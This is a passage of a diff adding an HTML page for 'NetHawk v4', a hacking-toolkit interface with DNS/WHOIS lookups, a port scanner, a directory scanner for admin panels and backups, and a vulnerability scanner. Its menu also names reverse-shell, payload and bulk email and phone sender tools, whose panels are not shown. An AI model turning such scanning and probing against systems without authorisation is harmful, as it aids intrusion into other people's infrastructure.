@@ -1,0 +1,1673 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>NetHawk v4</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+html,body{height:100%;background:#03070d;color:#b8dcea;font-family:monospace;overflow:hidden;display:flex;flex-direction:column}
+:root{
+  --bg:#03070d;--bg2:#060f18;--panel:#07111c;--brd:#0c2035;--brd2:#0f2d45;
+  --cyan:#00d4ff;--grn:#00ff88;--red:#ff3c6e;--orn:#ffaa00;--dim:#2a5570;
+  --text:#b8dcea;--text2:#7aaec8;--purple:#c778ff;
+}
+body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,0.05) 2px,rgba(0,0,0,0.05) 4px);pointer-events:none;z-index:9000}
+/* ticker */
+#ticker{height:26px;background:#040c14;border-bottom:1px solid var(--brd);overflow:hidden;flex-shrink:0;position:relative;display:flex}
+#tlabel{background:var(--red);color:#fff;font-size:10px;letter-spacing:2px;padding:0 12px;display:flex;align-items:center;flex-shrink:0;font-weight:bold}
+#tscroll{flex:1;overflow:hidden;position:relative}
+#ttrack{white-space:nowrap;font-size:11px;color:var(--text2);line-height:26px;animation:tick 55s linear infinite;display:inline-block}
+#ttrack:hover{animation-play-state:paused}
+@keyframes tick{0%{transform:translateX(100vw)}100%{transform:translateX(-100%)}}
+/* header */
+#hdr{height:48px;flex-shrink:0;background:#040c14;border-bottom:1px solid var(--brd);display:flex;align-items:center;justify-content:space-between;padding:0 16px}
+.logo{font-size:18px;font-weight:bold;color:var(--cyan);letter-spacing:4px;text-shadow:0 0 12px rgba(0,212,255,.5)}
+.hstats{display:flex;gap:20px;font-size:11px;color:var(--dim)}
+.hstats span{color:var(--cyan)}
+.dot{width:7px;height:7px;border-radius:50%;background:var(--grn);display:inline-block;margin-right:5px;box-shadow:0 0 6px var(--grn);animation:blink 1.4s step-end infinite}
+@keyframes blink{50%{opacity:0}}
+/* layout */
+#body{flex:1;display:flex;overflow:hidden}
+/* nav */
+#nav{width:205px;flex-shrink:0;background:var(--bg2);border-right:1px solid var(--brd);overflow-y:auto;padding-bottom:20px}
+#nav::-webkit-scrollbar{width:3px}#nav::-webkit-scrollbar-thumb{background:var(--brd)}
+.ns{font-size:9px;color:var(--dim);letter-spacing:3px;padding:14px 14px 5px;border-top:1px solid var(--brd);margin-top:4px}
+.ns:first-child{border-top:none;margin-top:0}
+.ni{display:flex;align-items:center;gap:8px;padding:8px 14px;font-size:12px;color:var(--dim);cursor:pointer;border-left:2px solid transparent;transition:all .15s}
+.ni:hover,.ni.on{color:var(--cyan);border-left-color:var(--cyan);background:rgba(0,212,255,.04)}
+.nbadge{margin-left:auto;font-size:9px;padding:1px 5px;border-radius:10px;background:rgba(255,60,110,.15);color:var(--red);border:1px solid rgba(255,60,110,.3)}
+.nbadge.new{background:rgba(0,255,136,.12);color:var(--grn);border-color:rgba(0,255,136,.3)}
+/* main */
+#main{flex:1;overflow-y:auto;padding:18px;background:var(--bg)}
+#main::-webkit-scrollbar{width:4px}#main::-webkit-scrollbar-thumb{background:var(--brd)}
+.panel{display:none;animation:fi .2s ease}
+.panel.on{display:block}
+@keyframes fi{from{opacity:0;transform:translateY(5px)}to{opacity:1;transform:translateY(0)}}
+.ptitle{font-size:13px;color:var(--cyan);letter-spacing:2px;text-shadow:0 0 10px rgba(0,212,255,.4);margin-bottom:3px}
+.pdesc{font-size:10px;color:var(--dim);border-left:2px solid var(--brd);padding-left:8px;margin-bottom:16px}
+/* card */
+.card{background:var(--panel);border:1px solid var(--brd);border-radius:3px;padding:14px;margin-bottom:12px;position:relative;overflow:hidden}
+.card::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,var(--cyan),transparent);opacity:.25}
+.clabel{font-size:9px;color:var(--dim);letter-spacing:2px;text-transform:uppercase;margin-bottom:9px;display:flex;align-items:center;gap:6px}
+.clabel::after{content:'';flex:1;height:1px;background:var(--brd)}
+.disc{background:rgba(255,60,110,.05);border:1px solid rgba(255,60,110,.2);border-radius:3px;padding:9px 12px;font-size:10px;color:#cc6080;margin-bottom:14px;line-height:1.6}
+.disc.info{background:rgba(0,212,255,.04);border-color:rgba(0,212,255,.2);color:var(--text2)}
+/* inputs */
+.row{display:flex;gap:7px;flex-wrap:wrap;margin-bottom:9px;align-items:center}
+input,select,textarea{background:#040b12;border:1px solid var(--brd);color:var(--text);font-family:monospace;font-size:12px;padding:7px 10px;border-radius:2px;outline:none;flex:1;min-width:100px;transition:border-color .15s}
+input:focus,select:focus,textarea:focus{border-color:var(--cyan)}
+select option{background:#040b12}
+textarea{resize:vertical;min-height:70px}
+input[type=range]{flex:1;accent-color:var(--cyan)}
+input[type=checkbox]{flex:none;width:14px;height:14px;accent-color:var(--cyan)}
+/* buttons */
+.btn{font-size:10px;font-weight:bold;letter-spacing:1px;padding:7px 14px;border:none;border-radius:2px;cursor:pointer;transition:all .15s;text-transform:uppercase;white-space:nowrap;font-family:monospace}
+.bp{background:var(--cyan);color:#020810}.bp:hover{background:#33dcff}
+.bg{background:var(--grn);color:#020810}.bg:hover{background:#33ffaa}
+.br{background:rgba(255,60,110,.12);color:var(--red);border:1px solid rgba(255,60,110,.3)}.br:hover{background:rgba(255,60,110,.22)}
+.bw{background:rgba(255,170,0,.1);color:var(--orn);border:1px solid rgba(255,170,0,.3)}.bw:hover{background:rgba(255,170,0,.2)}
+.bgh{background:transparent;color:var(--text2);border:1px solid var(--brd2)}.bgh:hover{border-color:var(--cyan);color:var(--cyan)}
+.bpu{background:rgba(199,120,255,.12);color:var(--purple);border:1px solid rgba(199,120,255,.3)}.bpu:hover{background:rgba(199,120,255,.22)}
+.sm{font-size:9px;padding:5px 10px}
+/* terminal */
+.term{background:#020912;border:1px solid var(--brd);border-radius:3px;padding:11px;font-size:12px;line-height:1.6;min-height:80px;max-height:320px;overflow-y:auto;white-space:pre-wrap;word-break:break-all;font-family:monospace}
+.term::-webkit-scrollbar{width:3px}.term::-webkit-scrollbar-thumb{background:var(--brd)}
+.c{color:var(--cyan)}.g{color:var(--grn)}.r{color:var(--red)}.o{color:var(--orn)}.d{color:var(--dim)}.y{color:#d4b84a}.w{color:#e8f4ff}.pu{color:var(--purple)}
+/* grid */
+.rg{display:grid;grid-template-columns:repeat(auto-fill,minmax(140px,1fr));gap:7px;margin-top:9px}
+.rc{background:#040c15;border:1px solid var(--brd);border-radius:2px;padding:8px 10px}
+.rl{color:var(--dim);font-size:9px;letter-spacing:1px;margin-bottom:3px}
+.rv{color:var(--grn);font-size:12px;word-break:break-all}
+/* progress */
+.prog{height:2px;background:var(--brd);border-radius:1px;overflow:hidden;margin:5px 0}
+.pf{height:100%;background:linear-gradient(90deg,var(--cyan),var(--grn));transition:width .2s}
+/* table */
+.tbl{width:100%;border-collapse:collapse;font-size:12px}
+.tbl th{text-align:left;color:var(--dim);font-size:9px;letter-spacing:2px;text-transform:uppercase;padding:6px 8px;border-bottom:1px solid var(--brd)}
+.tbl td{padding:6px 8px;border-bottom:1px solid rgba(12,32,53,.5)}
+.tbl tr:hover td{background:rgba(0,212,255,.02)}
+/* badge */
+.badge{display:inline-block;font-size:9px;padding:2px 6px;border-radius:20px;letter-spacing:1px;text-transform:uppercase}
+.bo{background:rgba(0,255,136,.1);color:var(--grn);border:1px solid rgba(0,255,136,.25)}
+.bc{background:rgba(255,60,110,.1);color:var(--red);border:1px solid rgba(255,60,110,.25)}
+.bf{background:rgba(255,170,0,.1);color:var(--orn);border:1px solid rgba(255,170,0,.25)}
+.bi{background:rgba(0,212,255,.1);color:var(--cyan);border:1px solid rgba(0,212,255,.25)}
+.bh{background:rgba(255,60,110,.15);color:#ff88aa;border:1px solid rgba(255,60,110,.3)}
+.bm{background:rgba(255,170,0,.1);color:var(--orn);border:1px solid rgba(255,170,0,.25)}
+.bpu2{background:rgba(199,120,255,.1);color:var(--purple);border:1px solid rgba(199,120,255,.25)}
+/* tabs */
+.tabs{display:flex;border-bottom:1px solid var(--brd);margin-bottom:12px;overflow-x:auto;gap:1px}
+.tab{font-size:10px;padding:7px 12px;cursor:pointer;color:var(--dim);border-bottom:2px solid transparent;transition:all .15s;white-space:nowrap}
+.tab.on{color:var(--cyan);border-bottom-color:var(--cyan)}
+.tp{display:none}.tp.on{display:block}
+/* spinner */
+.spin{display:inline-block;width:11px;height:11px;border:2px solid var(--brd);border-top-color:var(--cyan);border-radius:50%;animation:rot .5s linear infinite;vertical-align:middle;margin-right:5px}
+@keyframes rot{to{transform:rotate(360deg)}}
+/* news */
+.ngrid{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:10px}
+.ncard{background:var(--panel);border:1px solid var(--brd);border-radius:3px;padding:12px;cursor:pointer;transition:all .15s}
+.ncard:hover{border-color:var(--brd2);background:#091520}
+.ntag{font-size:9px;letter-spacing:2px;text-transform:uppercase;margin-bottom:5px}
+.ntag.conflict{color:var(--red)}.ntag.apt{color:var(--cyan)}.ntag.breach{color:#ff88aa}.ntag.vuln{color:var(--orn)}
+.ntitle{font-size:13px;font-weight:bold;color:var(--text);line-height:1.35;margin-bottom:5px}
+.nmeta{font-size:10px;color:var(--dim)}
+.nsrc{color:var(--cyan);margin-right:8px}
+.art{display:none}.art.on{display:block}
+.aback{font-size:11px;color:var(--cyan);cursor:pointer;margin-bottom:12px;display:inline-block}
+.aback:hover{text-decoration:underline}
+.atitle{font-size:18px;font-weight:bold;color:var(--text);margin-bottom:7px;line-height:1.3}
+.abody{font-size:12px;color:var(--text2);line-height:1.85;white-space:pre-wrap}
+/* threat map */
+.tmap{width:100%;height:260px;background:#040c14;border:1px solid var(--brd);border-radius:3px;position:relative;overflow:hidden;margin-bottom:12px}
+.tmg{position:absolute;inset:0;background-image:linear-gradient(rgba(12,32,53,.35) 1px,transparent 1px),linear-gradient(90deg,rgba(12,32,53,.35) 1px,transparent 1px);background-size:40px 40px}
+.tmlabel{position:absolute;top:8px;left:10px;font-size:9px;color:var(--dim);letter-spacing:2px}
+.tmstat{position:absolute;bottom:10px;right:10px;text-align:right;font-size:10px;color:var(--dim)}
+.tmval{font-size:22px;color:var(--red);display:block;text-shadow:0 0 10px rgba(255,60,110,.5)}
+/* cve */
+.cve{background:var(--panel);border:1px solid var(--brd);border-radius:3px;padding:11px;margin-bottom:8px;display:flex;gap:10px;cursor:pointer;transition:all .15s}
+.cve:hover{border-color:var(--brd2)}
+.cscore{flex-shrink:0;width:42px;height:42px;border-radius:2px;display:flex;align-items:center;justify-content:center;font-size:13px;font-weight:bold}
+.scrit{background:rgba(255,60,110,.15);color:var(--red);border:1px solid rgba(255,60,110,.3)}
+.shigh{background:rgba(255,100,0,.15);color:#ff8833;border:1px solid rgba(255,100,0,.3)}
+.smed{background:rgba(255,170,0,.1);color:var(--orn);border:1px solid rgba(255,170,0,.25)}
+.cid{font-size:10px;color:var(--cyan);margin-bottom:2px;letter-spacing:1px}
+.cname{font-size:13px;font-weight:bold;color:var(--text);margin-bottom:3px}
+.cdesc{font-size:10px;color:var(--dim);line-height:1.5;display:none}
+.cve.open .cdesc{display:block}
+/* shell */
+.sgrid{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:7px}
+.sc{background:#040c14;border:1px solid var(--brd);border-radius:2px;padding:9px;cursor:pointer;transition:all .15s;font-size:11px}
+.sc:hover{border-color:var(--cyan);color:var(--cyan)}
+.sl{color:var(--cyan);font-size:9px;margin-bottom:3px;letter-spacing:1px}
+.sn{color:var(--text2)}
+/* payload list */
+.pitem{background:#020912;border:1px solid var(--brd);border-radius:2px;padding:7px 10px;margin-bottom:5px;display:flex;align-items:center;gap:8px}
+.pnum{color:var(--dim);min-width:18px;font-size:11px}
+.pcode{flex:1;word-break:break-all;font-size:12px;color:var(--grn);font-family:monospace}
+/* two col */
+.tcol{display:grid;grid-template-columns:1fr 1fr;gap:10px}
+/* sender log */
+.slog-entry{padding:5px 8px;border-left:2px solid var(--brd);margin-bottom:4px;font-size:11px;line-height:1.5}
+.slog-entry.ok{border-left-color:var(--grn)}
+.slog-entry.fail{border-left-color:var(--red)}
+.slog-entry.pending{border-left-color:var(--orn)}
+/* multi-sender list */
+.recip-list{background:#020912;border:1px solid var(--brd);border-radius:2px;padding:6px;max-height:140px;overflow-y:auto;margin-bottom:8px}
+.recip-item{display:flex;align-items:center;gap:6px;padding:3px 5px;border-radius:2px;font-size:11px;cursor:pointer;transition:background .1s}
+.recip-item:hover{background:rgba(255,60,110,.07)}
+.recip-item .ri-val{flex:1;color:var(--text2)}
+.recip-item .ri-rm{color:var(--red);font-size:10px;opacity:.5;cursor:pointer}
+.recip-item .ri-rm:hover{opacity:1}
+/* stat boxes */
+.statrow{display:grid;grid-template-columns:repeat(auto-fill,minmax(90px,1fr));gap:7px;margin-bottom:12px}
+.statbox{background:var(--panel);border:1px solid var(--brd);border-radius:3px;padding:10px;text-align:center}
+.statbox .sv{font-size:20px;font-weight:bold;margin-bottom:2px}
+.statbox .sk{font-size:9px;color:var(--dim);letter-spacing:1px}
+/* tooltip */
+[data-tip]{position:relative;cursor:help}
+[data-tip]:hover::after{content:attr(data-tip);position:absolute;bottom:calc(100% + 4px);left:50%;transform:translateX(-50%);background:#040c14;border:1px solid var(--brd2);color:var(--text2);font-size:10px;padding:4px 8px;border-radius:2px;white-space:nowrap;z-index:100;pointer-events:none}
+@media(max-width:640px){#nav{display:none}.tcol{grid-template-columns:1fr}}
+</style>
+</head>
+<body>
+
+<div id="ticker">
+  <div id="tlabel">&#9889; INTEL</div>
+  <div id="tscroll"><div id="ttrack"></div></div>
+</div>
+
+<div id="hdr">
+  <div class="logo">&#11041; NETHAWK</div>
+  <div class="hstats">
+    <div><span class="dot"></span><span id="hclock">00:00:00</span></div>
+    <div>IP: <span id="hip">...</span></div>
+    <div>THREAT: <span style="color:var(--orn)">ELEVATED</span></div>
+    <div style="color:var(--purple)">v4.0</div>
+  </div>
+</div>
+
+<div id="body">
+
+<div id="nav">
+  <div class="ns">Intelligence</div>
+  <div class="ni on" onclick="go('dashboard',this)"><span>&#11041;</span> Dashboard</div>
+  <div class="ni" onclick="go('news',this)"><span>&#128225;</span> Cyber News <span class="nbadge">LIVE</span></div>
+  <div class="ni" onclick="go('threatmap',this)"><span>&#128506;</span> Threat Map</div>
+  <div class="ni" onclick="go('cve',this)"><span>&#128308;</span> CVE Feed</div>
+  <div class="ns">Recon</div>
+  <div class="ni" onclick="go('dns',this)"><span>&#128269;</span> DNS Lookup</div>
+  <div class="ni" onclick="go('whois',this)"><span>&#128193;</span> WHOIS / RDAP</div>
+  <div class="ni" onclick="go('ipinfo',this)"><span>&#127758;</span> IP Geo</div>
+  <div class="ni" onclick="go('techdetect',this)"><span>&#129516;</span> Tech Detect</div>
+  <div class="ni" onclick="go('emailosint',this)"><span>&#128231;</span> Email OSINT</div>
+  <div class="ns">Scanning</div>
+  <div class="ni" onclick="go('portscan',this)"><span>&#128268;</span> Port Scanner</div>
+  <div class="ni" onclick="go('ping',this)"><span>&#128225;</span> Ping</div>
+  <div class="ni" onclick="go('headers',this)"><span>&#128203;</span> HTTP Headers</div>
+  <div class="ni" onclick="go('dirscan',this)"><span>&#128193;</span> Dir Scanner</div>
+  <div class="ni" onclick="go('vulnscan',this)"><span>&#9888;</span> Vuln Scanner</div>
+  <div class="ns">Utilities</div>
+  <div class="ni" onclick="go('subnet',this)"><span>&#129518;</span> Subnet Calc</div>
+  <div class="ni" onclick="go('encode',this)"><span>&#128272;</span> Encode / Hash</div>
+  <div class="ni" onclick="go('cipher',this)"><span>&#128273;</span> Ciphers</div>
+  <div class="ni" onclick="go('payloads',this)"><span>&#128137;</span> Payloads</div>
+  <div class="ni" onclick="go('revshell',this)"><span>&#128012;</span> Rev Shell</div>
+  <div class="ni" onclick="go('regex',this)"><span>&#128270;</span> Regex Tester</div>
+  <div class="ni" onclick="go('jwt',this)"><span>&#127915;</span> JWT Decoder</div>
+  <div class="ni" onclick="go('passwords',this)"><span>&#127922;</span> Passwords</div>
+  <div class="ns">Senders <span style="color:var(--purple)">NEW</span></div>
+  <div class="ni" onclick="go('emailsender',this)"><span>&#128235;</span> Email Sender <span class="nbadge new">NEW</span></div>
+  <div class="ni" onclick="go('phonesender',this)"><span>&#128242;</span> Phone Sender <span class="nbadge new">NEW</span></div>
+  <div class="ns">My Network</div>
+  <div class="ni" onclick="go('myinfo',this)"><span>&#128187;</span> My Info</div>
+  <div class="ni" onclick="go('webrtc',this)"><span>&#128065;</span> WebRTC Leak</div>
+</div>
+
+<div id="main">
+
+<!-- DASHBOARD -->
+<div class="panel on" id="p-dashboard">
+  <div class="ptitle">&#9672; NETHAWK DASHBOARD</div>
+  <div class="pdesc">Cyber Intelligence &amp; Ethical Hacking Platform v4.0</div>
+  <div class="tcol" style="margin-bottom:12px">
+    <div class="card" style="text-align:center;padding:18px">
+      <div id="d-attacks" style="font-size:28px;color:var(--red);text-shadow:0 0 10px rgba(255,60,110,.5)">0</div>
+      <div style="font-size:9px;color:var(--dim);letter-spacing:2px;margin-top:3px">ATTACKS TODAY</div>
+    </div>
+    <div class="card" style="text-align:center;padding:18px">
+      <div style="font-size:28px;color:var(--orn)">12</div>
+      <div style="font-size:9px;color:var(--dim);letter-spacing:2px;margin-top:3px">CRITICAL CVEs</div>
+    </div>
+  </div>
+  <div class="tcol">
+    <div class="card">
+      <div class="clabel">Recent Threats</div>
+      <div style="font-size:11px;line-height:2">
+        <div>&#128308; <span style="color:var(--red)">CRIT</span> <span class="d"> CVE-2025-1938 Apache RCE</span></div>
+        <div>&#128992; <span style="color:var(--orn)">HIGH</span> <span class="d"> APT42 PhantomMail Campaign</span></div>
+        <div>&#128308; <span style="color:var(--red)">CRIT</span> <span class="d"> Volt Typhoon ICS Access</span></div>
+        <div>&#128992; <span style="color:var(--orn)">HIGH</span> <span class="d"> Salt Typhoon Telecom Breach</span></div>
+        <div>&#128993; <span style="color:#d4b84a">MED </span> <span class="d"> IRGC Contractor Leak Op</span></div>
+      </div>
+    </div>
+    <div class="card">
+      <div class="clabel">Quick Launch</div>
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:6px">
+        <button class="btn bgh sm" onclick="go('dns',null)">DNS Lookup</button>
+        <button class="btn bgh sm" onclick="go('portscan',null)">Port Scan</button>
+        <button class="btn bgh sm" onclick="go('whois',null)">WHOIS</button>
+        <button class="btn bgh sm" onclick="go('encode',null)">Hash Tool</button>
+        <button class="btn bgh sm" onclick="go('emailsender',null)">Email Sender</button>
+        <button class="btn bgh sm" onclick="go('phonesender',null)">Phone Sender</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- NEWS -->
+<div class="panel" id="p-news">
+  <div class="ptitle">&#9672; CYBER INTELLIGENCE NEWS</div>
+  <div class="pdesc">Iran/USA conflict, APT ops, zero-days, breaches</div>
+  <div class="disc"><strong style="color:var(--red)">INTEL:</strong> US-Iran cyber tensions at multi-year high. APT42, APT34 (OilRig), Charming Kitten conducting aggressive ops against US defense &amp; energy sectors. CYBERCOM acknowledged retaliatory offensive operations.</div>
+  <div class="tabs" id="ntabs">
+    <div class="tab on" onclick="ntab('all',this)">ALL</div>
+    <div class="tab" onclick="ntab('conflict',this)">IRAN/USA</div>
+    <div class="tab" onclick="ntab('apt',this)">APT</div>
+    <div class="tab" onclick="ntab('breach',this)">BREACHES</div>
+    <div class="tab" onclick="ntab('vuln',this)">ZERO-DAYS</div>
+  </div>
+  <div id="ngrid" class="ngrid"></div>
+  <div id="nart" class="art"></div>
+</div>
+
+<!-- THREAT MAP -->
+<div class="panel" id="p-threatmap">
+  <div class="ptitle">&#9672; LIVE THREAT MAP</div>
+  <div class="pdesc">Simulated real-time global cyberattack visualization</div>
+  <div class="tmap" id="tmap">
+    <div class="tmg"></div>
+    <div class="tmlabel">GLOBAL ATTACK MONITORING</div>
+    <canvas id="tmcanvas" style="position:absolute;inset:0;width:100%;height:100%"></canvas>
+    <div class="tmstat"><span class="tmval" id="tmcount">0</span>ATTACKS TRACKED</div>
+  </div>
+  <div class="tcol">
+    <div class="card">
+      <div class="clabel">Top Sources</div>
+      <div style="font-size:11px;line-height:2">
+        <div style="display:flex;justify-content:space-between">&#127470;&#127479; Iran (IRGC)<span style="color:var(--red)">HIGH</span></div>
+        <div style="display:flex;justify-content:space-between">&#127464;&#127475; China (Volt/Salt)<span style="color:var(--red)">HIGH</span></div>
+        <div style="display:flex;justify-content:space-between">&#127479;&#127482; Russia (Sandworm)<span style="color:var(--orn)">MED</span></div>
+        <div style="display:flex;justify-content:space-between">&#127472;&#127477; N.Korea (Lazarus)<span style="color:var(--orn)">MED</span></div>
+      </div>
+    </div>
+    <div class="card">
+      <div class="clabel">Attack Types</div>
+      <div style="font-size:11px;line-height:2">
+        <div style="display:flex;justify-content:space-between">Spearphishing<span style="color:var(--cyan)">34%</span></div>
+        <div style="display:flex;justify-content:space-between">RCE Exploits<span style="color:var(--cyan)">22%</span></div>
+        <div style="display:flex;justify-content:space-between">Supply Chain<span style="color:var(--cyan)">18%</span></div>
+        <div style="display:flex;justify-content:space-between">DDoS<span style="color:var(--cyan)">14%</span></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- CVE -->
+<div class="panel" id="p-cve">
+  <div class="ptitle">&#9672; CVE VULNERABILITY FEED</div>
+  <div class="pdesc">Critical/high CVEs — click to expand</div>
+  <div id="cvelist"></div>
+</div>
+
+<!-- DNS -->
+<div class="panel" id="p-dns">
+  <div class="ptitle">&#9672; DNS LOOKUP</div>
+  <div class="pdesc">Query DNS records via Google DoH — A, AAAA, MX, NS, TXT, CNAME, SOA</div>
+  <div class="disc"><strong style="color:var(--red)">ETHICAL USE ONLY</strong> — Only test systems you own or have explicit permission to test.</div>
+  <div class="card">
+    <div class="clabel">Query</div>
+    <div class="row">
+      <input id="dns-d" placeholder="example.com" type="text">
+      <select id="dns-t"><option>A</option><option>AAAA</option><option>MX</option><option>NS</option><option>TXT</option><option>CNAME</option><option>SOA</option><option>CAA</option></select>
+      <button class="btn bp" onclick="doDNS()">QUERY</button>
+      <button class="btn bgh sm" onclick="doDNSAll()">ALL RECORDS</button>
+    </div>
+    <div class="term" id="dns-out"><span class="d">// Enter domain and hit QUERY</span></div>
+  </div>
+</div>
+
+<!-- WHOIS -->
+<div class="panel" id="p-whois">
+  <div class="ptitle">&#9672; WHOIS / RDAP</div>
+  <div class="pdesc">Domain registration data via RDAP protocol</div>
+  <div class="card">
+    <div class="clabel">Target</div>
+    <div class="row">
+      <input id="whois-t" placeholder="example.com or 8.8.8.8" type="text">
+      <button class="btn bp" onclick="doWhois()">LOOKUP</button>
+    </div>
+    <div id="whois-r"><span class="d" style="font-size:11px">// Awaiting target</span></div>
+  </div>
+</div>
+
+<!-- IP INFO -->
+<div class="panel" id="p-ipinfo">
+  <div class="ptitle">&#9672; IP GEOLOCATION</div>
+  <div class="pdesc">Trace any IP — city, ISP, ASN, timezone, coordinates</div>
+  <div class="card">
+    <div class="clabel">IP Address</div>
+    <div class="row">
+      <input id="ip-t" placeholder="Leave blank for your own IP" type="text">
+      <button class="btn bp" onclick="doIP()">TRACE</button>
+    </div>
+    <div id="ip-r"><span class="d" style="font-size:11px">// Enter IP or leave blank for your IP</span></div>
+  </div>
+</div>
+
+<!-- TECH DETECT -->
+<div class="panel" id="p-techdetect">
+  <div class="ptitle">&#9672; TECHNOLOGY DETECTION</div>
+  <div class="pdesc">Fingerprint CMS, frameworks, CDN, analytics via signature analysis</div>
+  <div class="card">
+    <div class="clabel">Target URL</div>
+    <div class="row">
+      <input id="tech-u" placeholder="https://example.com" type="text">
+      <button class="btn bp" onclick="doTech()">FINGERPRINT</button>
+    </div>
+    <div id="tech-r"><span class="d" style="font-size:11px">// Enter URL to fingerprint</span></div>
+  </div>
+</div>
+
+<!-- EMAIL OSINT -->
+<div class="panel" id="p-emailosint">
+  <div class="ptitle">&#9672; EMAIL OSINT</div>
+  <div class="pdesc">Validate email, detect disposable domains, analyze MX records</div>
+  <div class="card">
+    <div class="clabel">Email</div>
+    <div class="row">
+      <input id="em-t" placeholder="target@example.com" type="text">
+      <button class="btn bp" onclick="doEmail()">ANALYZE</button>
+    </div>
+    <div id="em-r"><span class="d" style="font-size:11px">// Enter email to analyze</span></div>
+  </div>
+</div>
+
+<!-- PORT SCAN -->
+<div class="panel" id="p-portscan">
+  <div class="ptitle">&#9672; PORT SCANNER</div>
+  <div class="pdesc">HTTP-based port probing — for full scanning use nmap locally</div>
+  <div class="disc"><strong style="color:var(--red)">AUTHORIZED USE ONLY.</strong> Browser TCP is limited — uses HTTP/HTTPS probes. Only scan systems you own.</div>
+  <div class="card">
+    <div class="clabel">Target</div>
+    <div class="row">
+      <input id="pt-h" placeholder="example.com or IP" type="text">
+      <select id="pt-p" onchange="document.getElementById('pt-cr').style.display=this.value=='custom'?'flex':'none'">
+        <option value="common">Common (20 ports)</option>
+        <option value="web">Web Services</option>
+        <option value="db">Databases</option>
+        <option value="mail">Mail</option>
+        <option value="custom">Custom</option>
+      </select>
+    </div>
+    <div class="row" id="pt-cr" style="display:none">
+      <input id="pt-c" placeholder="80,443,22 or 1-200" type="text">
+    </div>
+    <div class="row">
+      <button class="btn bp" onclick="doScan()">SCAN</button>
+      <button class="btn bw sm" onclick="scanStop=true">&#9632; STOP</button>
+    </div>
+    <div class="prog"><div class="pf" id="pt-prog" style="width:0%"></div></div>
+    <div id="pt-st" style="font-size:10px;color:var(--dim);margin-bottom:7px">—</div>
+    <table class="tbl" id="pt-tbl" style="display:none">
+      <thead><tr><th>PORT</th><th>SERVICE</th><th>STATUS</th><th>MS</th><th>NOTE</th></tr></thead>
+      <tbody id="pt-tb"></tbody>
+    </table>
+  </div>
+</div>
+
+<!-- PING -->
+<div class="panel" id="p-ping">
+  <div class="ptitle">&#9672; PING / LATENCY</div>
+  <div class="pdesc">HTTP round-trip latency measurement to any host</div>
+  <div class="card">
+    <div class="clabel">Host</div>
+    <div class="row">
+      <input id="pg-h" placeholder="example.com" type="text">
+      <input id="pg-c" value="8" type="number" min="1" max="20" style="max-width:65px">
+      <button class="btn bp" onclick="doPing()">PING</button>
+    </div>
+    <div class="term" id="pg-out"><span class="d">// Ready</span></div>
+    <div id="pg-st"></div>
+  </div>
+</div>
+
+<!-- HEADERS -->
+<div class="panel" id="p-headers">
+  <div class="ptitle">&#9672; HTTP HEADERS</div>
+  <div class="pdesc">Inspect HTTP response headers and security posture</div>
+  <div class="card">
+    <div class="clabel">URL</div>
+    <div class="row">
+      <input id="hd-u" placeholder="https://example.com" type="text">
+      <button class="btn bp" onclick="doHeaders()">FETCH</button>
+    </div>
+    <div class="term" id="hd-out"><span class="d">// Enter URL</span></div>
+  </div>
+</div>
+
+<!-- DIR SCAN -->
+<div class="panel" id="p-dirscan">
+  <div class="ptitle">&#9672; DIRECTORY SCANNER</div>
+  <div class="pdesc">Common path and file discovery via HTTP probing</div>
+  <div class="disc"><strong style="color:var(--red)">AUTHORIZED USE ONLY.</strong> Only scan websites you own or have explicit written permission to test.</div>
+  <div class="card">
+    <div class="clabel">Target</div>
+    <div class="row">
+      <input id="dr-u" placeholder="https://example.com" type="text">
+      <select id="dr-l">
+        <option value="common">Common Files</option>
+        <option value="admin">Admin Panels</option>
+        <option value="api">API Endpoints</option>
+        <option value="backup">Backup Files</option>
+      </select>
+      <button class="btn bp" onclick="doDir()">SCAN</button>
+      <button class="btn bw sm" onclick="dirStop=true">&#9632; STOP</button>
+    </div>
+    <div class="prog"><div class="pf" id="dr-prog" style="width:0%"></div></div>
+    <div id="dr-st" style="font-size:10px;color:var(--dim);margin-bottom:7px">—</div>
+    <table class="tbl" id="dr-tbl" style="display:none">
+      <thead><tr><th>PATH</th><th>STATUS</th><th>SIZE</th><th>NOTE</th></tr></thead>
+      <tbody id="dr-tb"></tbody>
+    </table>
+  </div>
+</div>
+
+<!-- VULN SCAN -->
+<div class="panel" id="p-vulnscan">
+  <div class="ptitle">&#9672; VULNERABILITY SCANNER</div>
+  <div class="pdesc">Web vulnerability and misconfiguration checks</div>
+  <div class="disc"><strong style="color:var(--red)">AUTHORIZED USE ONLY.</strong> Only scan systems you own or have permission to test.</div>
+  <div class="card">
+    <div class="clabel">Target URL</div>
+    <div class="row">
+      <input id="vs-u" placeholder="https://example.com" type="text">
+      <button class="btn bp" onclick="doVuln()">SCAN</button>
+    </div>
+    <div id="vs-r"><span class="d" style="font-size:11px">// Enter URL to scan</span></div>
+  </div>
+</div>
+
+<!-- SUBNET -->
+<div class="panel" id="p-subnet">
+  <div class="ptitle">&#9672; SUBNET CALCULATOR</div>
+  <div class="pdesc">CIDR subnet math — host range, broadcast, wildcard mask</div>
+  <div class="card">
+    <div class="row">
+      <input id="sn-i" placeholder="192.168.1.0/24" type="text">
+      <button class="btn bp" onclick="doSubnet()">CALCULATE</button>
+    </div>
+    <div id="sn-r"></div>
+  </div>
+  <div class="card">
+    <div class="clabel">CIDR Reference</div>
+    <table class="tbl" id="sn-ref"></table>
+  </div>
+</div>
+
+<!-- ENCODE -->
+<div class="panel" id="p-encode">
+  <div class="ptitle">&#9672; ENCODE / HASH</div>
+  <div class="pdesc">Base64, URL, Hex, Binary, HTML entities, SHA hashing</div>
+  <div class="tabs">
+    <div class="tab on" onclick="etab('b64',this)">Base64</div>
+    <div class="tab" onclick="etab('url',this)">URL</div>
+    <div class="tab" onclick="etab('hex',this)">Hex</div>
+    <div class="tab" onclick="etab('bin',this)">Binary</div>
+    <div class="tab" onclick="etab('hash',this)">Hash</div>
+    <div class="tab" onclick="etab('html',this)">HTML Ent</div>
